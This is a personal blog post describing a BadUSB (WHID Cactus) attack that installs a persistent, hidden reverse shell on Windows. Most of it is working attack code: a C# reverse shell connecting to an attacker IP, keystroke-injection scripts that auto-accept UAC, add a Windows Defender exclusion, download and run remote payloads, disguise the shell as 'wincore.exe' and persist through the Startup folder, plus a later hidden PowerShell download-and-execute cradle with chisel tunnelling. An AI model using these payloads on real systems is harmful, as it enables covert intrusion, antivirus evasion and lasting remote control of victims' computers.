---
permalink: /portfolio/whid/
author: Rick Theeuwes

defaults:
  # _pages
  - scope:
      path: ""
      type: pages
    values:
      layout: single
      author_profile: true
toc: true
title: Hacking with WHID
---

## Persistent reverse shell

A reverse shell is great, but what if he stayed, no matter what? Using a Bad-USB of any kind, you can inject a payload to create a persistent reverse shell.

### The shell

First, we need our shell. This will be an executable written in `dotnet core 3.1` ([source](https://www.puckiestyle.nl/c-simple-reverse-shell/)):

```C#
using System;
using System.Diagnostics;
using System.IO;
using System.Net.Sockets;
using System.Text;
using System.Threading;

namespace Shell1
{
    class Program
    {
        static StreamWriter streamWriter;

        public static void Main(string[] args)
        {
            while (true)// keep going
            {
                try
                {
                    connect();
                }
                catch { }

                Thread.Sleep(60000); //wait a minute before reconnecting
            }
        }

        private static void connect()
        {
            using(TcpClient client = new TcpClient("192.168.241.1", 8090)) //connect to attacker
            {
                using(Stream stream = client.GetStream())
                {
                    using(StreamReader rdr = new StreamReader(stream))
                    {
                        streamWriter = new StreamWriter(stream);
                        StringBuilder strInput = new StringBuilder();

                        Process p = new Process();
                        p.StartInfo.FileName = "cmd.exe"; //use cmd, so it becauses a shell
                        p.StartInfo.CreateNoWindow = true;
                        p.StartInfo.UseShellExecute = false;
                        p.StartInfo.RedirectStandardOutput = true;
                        p.StartInfo.RedirectStandardInput = true;
                        p.StartInfo.RedirectStandardError = true;
                        p.OutputDataReceived += new DataReceivedEventHandler(CmdOutputDataHandler);
                        p.Start();
                        p.BeginOutputReadLine();

                        while(true)
                        {
                            strInput.Append(rdr.ReadLine());
                            //strInput.Append("\n");
                            p.StandardInput.WriteLine(strInput);
                            strInput.Remove(0, strInput.Length);
                        }
                    }
                }
            }
        }

        private static void CmdOutputDataHandler(object sendingProcess, DataReceivedEventArgs outLine)
        {
            StringBuilder strOutput = new StringBuilder();

            if (!String.IsNullOrEmpty(outLine.Data))
            {
                try
                {
                    strOutput.Append(outLine.Data);// show the output
                    streamWriter.WriteLine(strOutput);
                    streamWriter.Flush();
                }
                catch { }
            }
        }
    }
}
```

This code creates a reverse shell to the gives IP address, which is restarted every minute after closing. But this program has to be started by a user after every reboot. And the users won't just trust every program, so we need something to get the executable on the victim's system without their knowledge. Here the Bad-USB comes into play. For this example I used my WHID-Cactus, but it can be rewritten and used on any Bad-USB. I only changed the contents of the main method, so that the shell would reconnect after a minute.

```whid
Press:131+114
Print:powershell
Press:128+129+176
Press:216+176
PrintLine:(New-Object System.Net.WebClient).DownloadFile("http://192.168.241.1/shell.exe", "$env:APPDATA\..\Local\Microsoft\Windows\0\wincore.exe") //TODO MY ip
PrintLine:(New-Object System.Net.WebClient).DownloadFile("http://192.168.241.1/invis.vbs", "$env:APPDATA\..\Local\Microsoft\Windows\0\start.vbs")
PrintLine:Add-MpPreference -ExclusionProcess "wincore.exe"
PrintLine:$s = (New-Object -comObject WScript.Shell).CreateShortcut("$env:APPDATA\Microsoft\Windows\Start Menu\Programs\Startup\wincore.lnk"); $s.TargetPath="C:\Windows\System32\wscript.exe";$s.Arguments="`"$env:APPDATA\..\Local\Microsoft\Windows\0\start.vbs`" `"C:\Users\admin\AppData\Local\Microsoft\Windows\0\wincore.exe`""; $s.Save();
exit
```

This little piece of code will make the perfect shell. Let's look at it line by line.

```whid
Press:131+114
```

This simulates a key-press by using Arduino keyboard-codes. `131` is the Windows-key and `114` is the letter 'r'. This will open the `Run` box on windows, allowing you to start an executable.

```whid
Print:powershell
```

This just types powershell into the `Run` box without an `enter` key pressed.

```whid
Press:128+129+176
Press:216+176
```

The first line uses the Arduino codes again to press `control`, `shift` and `enter`. This will run the given command (`powershell`) as administrator, we need this to disable Windows Defender. The second line will type the left arrow and `enter`, so that the UAC (admin-prompt) is answered with `yes`.

```powershell
PrintLine:(New-Object System.Net.WebClient).DownloadFile("http://192.168.241.1/shell.exe", "$env:APPDATA\..\Local\Microsoft\Windows\0\wincore.exe")
PrintLine:(New-Object System.Net.WebClient).DownloadFile("http://192.168.241.1/invis.vbs", "$env:APPDATA\..\Local\Microsoft\Windows\0\start.vbs")
```

This is where the juicy stuff starts, first we download the `shell.exe` and a `vb` script called `invis.vbs`.

```vbs
CreateObject("Wscript.Shell").Run """" & WScript.Arguments(0) & """", 0, False
```

Why do we need this? This little script runs an executable completely hidden. Only far into taskmanager can you find the process, but nobody expects a process called `wincore` to be evil.

Both files are downloaded into `C:\users\{user}\AppData\Local\Microsoft\Windows\0\`, a folder very little people dare to even open, this is just another step to make the shell look like a windows process to "normal" people.

```powershell
PrintLine:Add-MpPreference -ExclusionProcess "wincore.exe"
```

This line is the reason that powershell must start with privileges, this line makes a exclusion in Defender for all the processes named `wincore.exe`. This allows the shell to run without any interjection from Windows Defender.

```powershell
PrintLine:$s = (New-Object -comObject WScript.Shell).CreateShortcut("$env:APPDATA\Microsoft\Windows\Start Menu\Programs\Startup\wincore.lnk"); $s.TargetPath="C:\Windows\System32\wscript.exe";$s.Arguments="`"$env:APPDATA\..\Local\Microsoft\Windows\0\start.vbs`" `"C:\Users\admin\AppData\Local\Microsoft\Windows\0\wincore.exe`""; $s.Save();
```

And lastly, we create a shortcut in `C:\users\{user}\AppDate\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\`. Everything executable or shortcut in this folder is run after the user logs in. This way we can start our shell every time the system boots. This does not run the shell yet, however if you want to run it immediately, you can just add this line to the script:

```powershell
PrinteLine:C:\Windows\System32\wscript.exe "C:\Users\admin\AppData\Roaming\..\Local\Microsoft\Windows\0\start.vbs" "C:\Users\admin\AppData\Local\Microsoft\Windows\0\wincore.exe"
```

This is simply the content of the shortcut.

We end the script with `exit`, so the user does not see that something is up. Currently, the script consists of multiple lines executed in powershell, but if it is rewritten to one powershell command that runs in the background, this injection can take only a few seconds to be ready. The execution then happens on the background, even when the usb is pulled out.

## Revision

So, I have been asked to give a short presentation on this subject, and I decided that I can go futher for this presentation. So, I looked into more parts of this in order to create a better payload.

For this, I wanted a few things, first, a different shell. After some googling I found this one: [C-Reverse-Shell](https://github.com/dev-frog/C-Reverse-Shell). A reverse shell written in C++, undetected by windows defender, this removed a step from my payload and also removed the need for Administrator rights. The next step was to make the executing way quicker. This was achieved by downloading and executing the script and the background, so that no time is wasted on typing.This is the result:

When the cactus is inserted, this payload is executed:

```whid
Press:131+114
PrintLine:powershell.exe -w hidden -noni -nop -c "iex(New-Object System.Net.WebClient).DownloadString('http://192.168.241.1/script.ps1')"
Press:176
```

A very simple, Windows + r, then a powershell command that downloads and executes a script, and does this all on the background. Then press enter. This is the executed script:

```powershell
(New-Object System.Net.WebClient).DownloadFile("http://192.168.241.1/re.exe", "$env:APPDATA\..\Local\Microsoft\Windows\0\wincore.exe")
(New-Object System.Net.WebClient).DownloadFile("http://192.168.241.1/chisel.exe", "$env:APPDATA\..\Local\Microsoft\Windows\0\chisel.exe")
(New-Object System.Net.WebClient).DownloadFile("http://192.168.241.1/start.ps1", "$env:APPDATA\..\Local\Microsoft\Windows\0\start.ps1")
$s = (New-Object -comObject WScript.Shell).CreateShortcut("$env:APPDATA\Microsoft\Windows\Start Menu\Programs\Startup\wincore.lnk"); $s.TargetPath="C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe";$s.Arguments="-ExecutionPolicy Bypass $env:APPDATA\..\Local\Microsoft\Windows\0\start.ps1";$s.Save();
$path = Resolve-Path "C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe"
Start-Process -FilePath $path -ArgumentList "-w hidden -ExecutionPolicy Bypass $env:APPDATA\..\Local\Microsoft\Windows\0\start.ps1"
```

The first three lines is downloading the files and placing then in my secret location. Then it makes a shortcut to execute on boot and last, it starts the payload:

```powershell
$path = Resolve-Path "$env:APPDATA\..\Local\Microsoft\Windows\0\chisel.exe"
Start-Process -FilePath $path -ArgumentList "client 192.168.241.1:9002 8090" -WindowStyle Hidden

Start-Sleep -s 2

$path = Resolve-Path "$env:APPDATA\..\Local\Microsoft\Windows\0\wincore.exe"
Start-Process -FilePath $path 
```

This starts the `chisel` client and connects to my server. Forwarding to local port 8090 to the attackers port 8090. Then it starts the reverse shell, which connects to `127.0.0.1:8090`, forwarded to the attackers machine.

![shark](https://raw.githubusercontent.com/Riqky/riqky.github.io/master/assets/images/shark.png)

Now, the downside of chisel is that it generates a lot more traffic, however, it is not just plain tcp traffic and it can be encrypted with SSL.